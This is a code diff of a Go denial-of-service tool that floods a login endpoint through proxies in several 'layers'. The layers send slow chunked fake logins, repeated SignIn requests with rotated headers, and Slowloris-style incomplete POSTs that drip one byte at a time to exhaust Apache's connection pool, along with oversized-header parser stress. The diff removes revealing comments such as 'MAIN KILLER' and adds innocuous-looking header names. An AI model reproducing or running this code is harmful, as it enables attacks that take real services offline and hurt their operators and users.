@@ -10,9 +10,6 @@ import (
 	"time"
 )
 
-// ============================================================
-// LAYER 1: LIGHT FAKE LOGIN — Slow chunked body (optimized)
-// ============================================================
 func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClient()
 	client.Timeout = 0
@@ -80,9 +77,6 @@ func lightSlowBody() io.Reader {
 	return r
 }
 
-// ============================================================
-// LAYER 2 + 3: MINIMAL — Just occasional SignIn hits
-// ============================================================
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
 	baseURL := strings.TrimRight(o.target.String(), "/")
@@ -124,13 +118,11 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// Longer delay — bandwidth bachane ke liye
 		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)
 	}
 }
 
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
-	// Same as L2 — just additional pressure with different headers
 	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
 	baseURL := strings.TrimRight(o.target.String(), "/")
 	targetURL := baseURL + "/sms/SignIn"
@@ -174,10 +166,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 	}
 }
 
-// ============================================================
-// LAYER 4: APACHE CONNECTION POOL EXHAUSTION — MAIN KILLER
-// Sabse kam bandwidth, sabse zyada damage
-// ============================================================
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
 
@@ -201,7 +189,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		// Incomplete POST — Apache waits for Content-Length body
 		incompleteReq := fmt.Sprintf(
 			"POST /sms/signmein HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999\r\nConnection: keep-alive\r\n\r\n",
 			o.target.Host,
@@ -214,7 +201,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 			continue
 		}
 
-		// VERY slow drip — bytes per second, connection stays for 20-30 seconds
 		for i := 0; i < 20; i++ {
 			select {
 			case <-ctx.Done():
@@ -224,7 +210,6 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 			}
 
 			conn.SetDeadline(time.Now().Add(5 * time.Second))
-			// Send just 10 bytes per iteration — extremely slow
 			if _, err := conn.Write([]byte("x")); err != nil {
 				break
 			}
@@ -234,9 +219,11 @@ func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error
 	}
 }
 
-// ============================================================
-// LAYER 5: PARSER STRESS — Light version
-// ============================================================
+var oversizedHeaderNames = []string{
+	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
+	"X-Analytics", "X-Device-Fingerprint", "X-Request-ID",
+}
+
 func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
 	baseURL := strings.TrimRight(o.target.String(), "/")
@@ -258,9 +245,7 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		}
 
 		req.Header.Set("User-Agent", randomUA())
-		// Just one oversized header instead of many
 		req.Header.Set("X-Oversized-Data", randomString(4096))
-		// Fewer duplicate headers
 		for i := 0; i < 20; i++ {
 			req.Header.Add("X-Dup", "v")
 		}
@@ -282,10 +267,6 @@ func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) erro
 		time.Sleep(time.Duration(rand.Intn(200)+100) * time.Millisecond)
 	}
 }
-
-// ============================================================
-// UTILITY FUNCTIONS
-// ============================================================
 
 var userAgents = []string{
 	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0.0.0 Mobile Safari/537.36",
